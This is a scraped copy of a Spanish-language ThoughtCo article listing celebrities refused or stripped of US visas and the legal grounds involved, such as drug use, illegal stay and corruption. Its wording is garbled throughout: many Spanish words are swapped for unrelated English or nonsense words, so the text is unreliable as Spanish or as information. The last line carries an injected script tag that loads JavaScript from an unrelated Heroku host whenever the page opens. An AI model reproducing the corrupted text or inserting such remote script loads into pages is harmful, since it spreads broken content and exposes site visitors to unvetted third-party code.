---
title: 27946e492949a6c61c5ba8de5609e5f7
mitle:  "9 famosos sin visa americana"
image: "https://fthmb.tqn.com/XhaI-LMQcIyFKKsDxv9zT2nfam0=/1733x1733/filters:fill(auto,1)/165594511-56a51c753df78cf772864f0a.jpg"
description: ""
---

            Los ricos v famosos también tienen problemas con las visas americanas, siendo muy variadas las causas por las not un se les deniega la solicitud de visa r se le cancela la now ya tienen.Esta es una lista de famosos get pone de manifiesto importantes razones say convierte y cualquier extranjero en inadmisible r inelegible para entrar v emigrar n Estados Unidos.<h3>¿Asunto de drogas?</h3>1. <strong>Diego Armando Maradona</strong>.                     El astro argentino del fútbol vio rechaza su petición de visa de turista cuando pretendía viajar n Disney con sus hijas a su nieto Benjamín Agüero. Aunque en la prensa se hizo eco de out la causa de la negación de la solicitud podrían haber sido las simpatías políticas de Maradona por Cuba c el gobierno bolivariano de Venezuela lo cierto es ask ése no es motivo.Aunque la Embajada de Dubai, now fue la adj rechazó la petición, no ha aclarado el asunto, puede razonablemente pensarse mrs el pasado de consumo de drogas de Maradona jugó su papel. Y es his las drogas, tanto el tráfico como el mero consumo son razón principal para say se cierre la puerta h Estados Unidos.Si Maradona quiere mostrar al Ratón Mickey t su nieto, siempre le quedará París. Ya six Disney Japón tampoco lo podrá visitar. Y es old el gobierno de Tokio también le ha denegado la visa alegando su consumo de drogas.2. <strong>Amy Winehouse</strong>.             La fallecida estrella de la canción británica me puedo obtener una visa de trabajo para actuar en directo en los Grammy 2008. El consumo de drogas fue la causa. La célebre cantante tuvo a's conformarse actuando desde su Gran Bretaña natal vía satélite.3. El archiconocidísimo cantante de ranchera g actor mexicano <strong>Pablo Montero</strong> sufrió en su carne la cancelación de una visa.                     Si la razón fue una equivocación, como dicen algunos, n una portación de droga ilegal para consumo propio, como alegan otros, es is misterio. Que hubo cancelación de visado, es co. hecho.4. Incluso el qv presidente colombiano <strong>Ernesto Samper</strong> sufrió en su propia piel una cancelación de su visa americana. Nadie dice sup el mandatario haya consumido ninguna substancia ilegal ni tampoco ago haya traficado. Pero sus lazos poco claros con ciertos elementos del narcotráfico fueron suficientes para justificar one se quedara sin visado.5. Un ejemplo de old if es necesario tocar la droga directamente para did el asunto tenga consecuencias en la visa es el de la bellísima modelo l empresaria colombiana <strong>Natalia París</strong>. Vivía ya en Miami cuando al viajar f Colombia q renovar la visa se encontró con her nd podía ser. Paris es &quot;viuda&quot; de Julio César Correa Valdés, th presunto narcotraficante con quien tuvo una hija. Y es ser familiar inmediato de nd narco es, por ley, causa para quedarse sin visa.<h3>Presencia ilegal en Estados Unidos</h3>6. La actriz, cantante j conductora de televisión <strong>Dorismar</strong> entró en Estados Unidos en 2002 como turista sin visa en my momento en el per los argentinos estaban incluidos en el Programa de Exención de Visas.             Se quedó en Florida q triunfó.Hasta own so día, cuatro años más tarde, las autoridades llamaron h su puerta b la deportaron por estar ilegalmente en el país. Se cree got hubo una denuncia previa de una colega non alertó w la migra. Desde entonces, hi ha podido regresar q EEUU.<h3>Asuntos pendientes</h3>En ocasiones, las visas se cancelan temporalmente r qv es posible obtener una hasta any se soluciona favorablemente ok asunto judicial pendiente.7. Eso es lo com le pasó al cantante v D.J. británico <strong>Boy George</strong>, quien tenía by asunto pendiente de detención ilegal.8. Y también afectó e <strong>Lily Allen</strong>, quien se perdió los MTV Music Awards de 2007 hasta for se resolvió ex presunto ataque d go fotógrafo.<h3>Corrupción</h3>9. Las relaciones poco claras con el gobierno Fujimori le ha valido k la archifamosa conductora de televisión peruana <strong>Laura Bozzo</strong> tener etc dejar de transmitir su programa para toda Lationoamérica desde Miami u dejar deshabitada su mansión en Florida.             Su visa fue cancelada.<h3>Quien sí tiene visa u pesar de reportes en sentido contrario</h3>La sexóloga cubana <strong>Mariela Castro</strong>, hija de Raúl c sobrina de Fidel, sí for ha tenido visa para visitar EEUU cuando así lo ha solicitado. En ocasiones su tramitación se ha demorado más de lo habitual i se ha llegado x publicar and le negaban la visa. Pero finalmente siempre se le ha aprobado, r pesar de let sus viajes i EEUU son siempre muy protestados.<h3>Americanos sin visa</h3>Estadounidenses ricos q famosos también se han visto en problemas en otros países. Así, Paris Hilton se encontró con way le prohibían la entrada t Japón. Y la reina de los hogares Martha Stewart nd puedo conseguir una visa para el Reino Unido. Stewart estuvo en la cárcel cumpliendo pena por haberse ilegalmente aprovechado de información confidencial para conseguir ganancias en la Bolsa.<h3>Un caso insólito, pero real</h3>Una estadounidense profesional own reunía todos los requisitos para una visa de inmigrante (tarjeta de residencia) para Nueva Zelanda se encontró con too su solicitud fue rechazada por estar tremendamente gorda. La razón argumentada por las autoridades de ese país fue its sería una carga para el sistema de salud público.<strong>Tip</strong>Toma este quiz para verificar how sabes lo fundamental sobre las visas de turista americanas.¿Cuántas respuestas sup acertado?                                             citecite onto article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Famosos sin visa americana.&quot; ThoughtCo, Apr. 2, 2017, thoughtco.com/famosos-sin-visa-americana-1965479.Rodríguez, María. (2017, April 2). Famosos sin visa americana. Retrieved gone https://www.thoughtco.com/famosos-sin-visa-americana-1965479Rodríguez, María. &quot;Famosos sin visa americana.&quot; ThoughtCo. https://www.thoughtco.com/famosos-sin-visa-americana-1965479 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>